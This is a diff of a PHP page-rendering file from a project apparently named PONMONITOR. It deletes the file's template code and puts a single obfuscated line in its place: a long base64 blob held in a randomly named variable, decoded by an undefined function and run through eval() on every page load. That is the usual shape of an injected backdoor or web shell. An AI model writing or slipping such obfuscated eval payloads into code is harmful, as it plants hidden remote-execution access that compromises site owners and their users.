@@ -2,22 +2,5 @@
 if (!defined('PONMONITOR')){
 	die('Hacking attempt!');
 }
-if(!empty($USER['id']))	require ENGINE_DIR.'menu.php';
-$tpl->load_template('html.tpl');
-$tpl->set('{html}',$html);
-$tpl->set('{ajax}',$ajax);
-$tpl->set('{head}',(isset($htmlhead)?$htmlhead:''));
-$tpl->set('{var}',$var);
-$tpl->set('{css}',$css);
-$tpl->set('{tpl}','/style/');
-$tpl->set('{folder}',$tpl->folder);
-$tpl->set('{content}',$tpl->result['content']);
-if($config['debugmysql']=='yes')
-	$queryList = $db->queryListdebug($db->query_list);
-$tpl->set('{debug}',($config['debugmysql']=='yes' && !empty($queryList['list'])?$queryList['list']:''));
-$tpl->set('{menu}',(!isset($tpl->result['menu'])?'':$tpl->result['menu']));
-$tpl->set('{block-right}',(!isset($tpl->result['block-right']) ? '' : $tpl->result['block-right']));
-$tpl->compile('main');
-echo $tpl->result['main'];
-$tpl->global_clear();
+$e7091f54gwh657e6ri8797r8k6e56sjs6j7es5j8k6rl8f="eTRTQnNzSVIxK3M5cXJ0cTBBZkJJeTd4azQwOWxybDdEaEtLN3REeW1KbHNaUFhuUmZyanVoVS9lVVRWOFlpcTMzVnNObkNkdDhVZ2ZxNnZTZUlUVmF0VXpIVDlqK2V0ZStZNEFJc0NiTGZ0dlFqMzgvRm03bjcvVllRcm1RUnUvcmhuamJCVHJlbyszVkpLcHB3RU9XZTVMekE2Rk4vY1VTM2VEZ0N3Mjh2bHFpUU9FTTE2WDFJYkIzNXQ1OWNaSFpOWjQ4TzJyUHo4LzF5bEZVWlBLUG5ObTBvbGpnN0VJVE9hd0FsL21EZGRZQ1I3Q29xUlVQYVprclQxWi9GNE5ybHRkOUF4MmthZmVmSnJNSDdpUGNIMVZjZzdyR09vZTRrcVpMUDlxSURjbC94L3RVM1FlWTZMNUtJdDFiQjNvb0MxYzhzQXhQRmRaMHh1TzdxRVZtNVY2MWlYZ1NMcmRmRTRmdUZ5a3hZWEdVcmlUSU1BM3g0YnVueStJbmZhRVd5WW45N1NYRXFPL2h1aU53ZTRCMVU2a2JuUFY4OWttSTk2NzBWc0F0VTZaVVN6bWlVdmNvVFIvRDVHS1AwLzNsRlBBaHlvRFg3eVpsUWhnWDY0NG9lYTJmOUcwYzZFTmpVSXY1WTEvb3JaeUI3NzlGL3lqOENXWFA5cEFEalZla3pNSEV3Sk9MNGJFVUtoZGVJUWNFL003WC9VL2l0bFA5cVp3b0VuamRXZXRsZWVqMDIzWnZBQU93OTROY2p6NkFOSHdubkhzanVKVmRFS2xRb1VmNGJPUDE1d0pORHk2WklVaW5pRVZsWml2QWtHUHkwY0pZU1FXYzAzakxrWUpseGpqR2paM3FhNEtWM2ZmSUFhR3JhTWNNaDduenM3U200UjNRcnpUeEdEb0NTRDNPN2JoTTM4VkxYYkp4R0FzaFZkTGh0NTJTbFNNRFVFRWxOcGxFM2x3eVowRFd3Qmp0THo0cldCcFVWbWF5eHRrK1kxRis0Q1dVT0tNY2tidUlYSGE4QmNERGxCQkpQeWY0NllMOUhiOUV1NkxkZHZzMWlyS2JIY01MS2RHWWY5RmFyR2dBT3EwdTVYSC8xUVpFVi9xLzY4TFVYTGF4NXJPdkZETmY1dzJ2WDBzTVhWamJac1lVQWo1b2xLUzRSWDdlcmU3Qi9XYUF5WkovTDdXNFczdGI1R2FVOUlLdWlYaGs1cFpEMXN0aWpBSmlBQUNYdWhlamxySHpQU3oyZU5oRk04blprakhzSWRELzRzUXZ0VnAvM21WS1dhQnV3NkpJc0F0UFc5RGl6RllsSk1ZRHF6c3JyNnltTWVjVk9vcndTOCs5eFMzc3V6d1hIQVB0YnJHT3JSMWFqK3JuL054dUE5VU5iaVgramZ4V1dXRzNHUEVkdldSZkIwbFlRcVMvU1E3LzF6TE5KY3psYmU0OWxsK2xlVExiNHBVVzdjNzlhT1NsSm1TcVlFVzJaWEtYMTYzL1VlaU1MQkwwdFdhZTg1b0t2anpRM00va28wVVBrbzRkam9uOTNZUmNoQ1dta3JZN0d1VlFnU0R0RWxGVUNGK1ZjamsxRWNyQ3JjcGxubUkyc1pWVFJUbGFBbHh4S0tUWE1tOXVjbmwwZFIrZUlBUElVR1VMRWhtcGNvSkJwQnBHUnY1dWQyK0hjT3o4TVNLZDhWbGp0TXlCYSthWWd5d0lFQXpMdk13Zk9JS00xT1hROTZjQ0tUVEJXQWtHeFhsQ2piYzNmLzdjT0lTQkZjTmY5QTRneWk1R3IxZTJoRDFxaGxSZVFzbU04QTNSOGM0Si9TUnV5MmxlUDFUeDZGOEEwVTdGcFFwOVN6L3B6ZlJSaG5IWnJYbENuU3ZHSllnME83dTBwREFaZThqaHkxY3pQa2VOZGZjK3BpTkgyczJWTkZGWFp4RjNudElJaUdFeXhFSTB5bFpFd1dYbFZnM3RPVm9sVG51T0J2bEhHN0pBPT0=";eval(e7061gi54w9w4689hjor6jhodyfijhfd0ykj0f97m59650ke7k($e7091f54gwh657e6ri8797r8k6e56sjs6j7es5j8k6rl8f));
 ?>
